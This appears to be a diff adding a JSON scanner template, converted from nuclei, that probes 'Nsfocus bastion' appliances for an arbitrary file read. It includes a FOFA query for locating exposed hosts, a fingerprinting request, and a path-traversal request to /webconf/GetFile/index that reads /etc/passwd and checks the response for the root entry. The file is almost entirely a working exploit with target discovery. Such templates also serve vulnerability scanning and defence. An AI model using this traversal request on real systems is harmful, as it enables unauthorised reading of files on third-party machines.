@@ -1,0 +1,181 @@
+{
+  "id": "nsfocus-lfi",
+  "name": "Nsfocus - Arbitrary File Read",
+  "author": "ritikchaddha",
+  "severity": "HIGH",
+  "description": "Nsfocus bastion has an Arbitrary File Read Vulnerability through \u0027/webconf/GetFile/\u0027.\n",
+  "references": [
+    "https://forum.butian.net/article/250"
+  ],
+  "tags": [
+    "nsfocus",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "body\u003d\"\u0027/needUsbkey.php?username\u003d\u0027\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /user/requireLogin HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(tolower(body), \u0027nsfocus\u0027)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /webconf/GetFile/index?path\u003d../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "regex(\u0027root:.*:0:0:\u0027, body)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "nsfocus-lfi",
+    "info": {
+      "name": "Nsfocus - Arbitrary File Read",
+      "author": "ritikchaddha",
+      "severity": "high",
+      "description": "Nsfocus bastion has an Arbitrary File Read Vulnerability through \u0027/webconf/GetFile/\u0027.\n",
+      "reference": [
+        "https://forum.butian.net/article/250"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "body\u003d\"\u0027/needUsbkey.php?username\u003d\u0027\""
+      },
+      "tags": "nsfocus,lfi"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /user/requireLogin HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(tolower(body), \u0027nsfocus\u0027)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /webconf/GetFile/index?path\u003d../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "regex(\u0027root:.*:0:0:\u0027, body)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
